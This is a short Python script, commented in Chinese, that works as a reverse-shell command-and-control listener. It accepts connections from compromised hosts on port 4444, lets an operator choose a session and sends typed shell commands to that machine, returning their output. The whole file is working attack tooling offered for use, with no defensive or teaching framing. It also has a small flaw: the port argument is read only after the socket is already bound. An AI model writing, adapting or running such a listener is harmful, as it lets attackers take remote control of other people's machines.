import socket
import threading
import argparse

lport = 4444

sock = socket.socket()
sock.bind(('0.0.0.0',lport))
sock.listen(1024)      
socklist = []  
numm = None

def con():              #主要保存主动上钩的连接
    num = 0
    print('等待主机加入')
    while True:
        (sk, addrport) = sock.accept()   #接收连接并返回一个套接字sk，addrport是地址跟端口，（sk,addrport）是一个元组
        socklist.append((sk, addrport))     #把接受的元组放进列表，保存起来，反向shell的重要事情！
        print('=============================================')
        print(f'\n主机{addrport}加入成功    session={num}\n')
        print('=============================================')

        num = num + 1

def who():          #选择主机函数
    global numm	
    numm = input('\n输入要控制主机的session>')
    print(f'选择主机{socklist[int(numm)][1][0]}成功')

def action():        #执行命令函数
    while True:
        cmd = input('shell>>')
        if len(socklist) > 1 and cmd == 'cchange' :
            who()
            action()
        if cmd == 'exit' :
            print('[*]goodbye')
            exit()
        if cmd == '':
            pass
        else:
            socklist[int(numm)][0].send(cmd.encode('utf-8')) #发送指令到client端
            data = socklist[int(numm)][0].recv(8192)   #接收反馈的信息
            print(data.decode('utf-8'))

def main():
    global lport
    parser = argparse.ArgumentParser(description='listen')
    parser.add_argument('lport',help='set port')
    args = parser.parse_args()
    lport = args.lport
    threading.Thread(target=con,args=()).start()  #挂一个线程保持接收连接
    while True:
        if len(socklist) != 0:
            who()
            action()

if __name__ == '__main__':
    main()







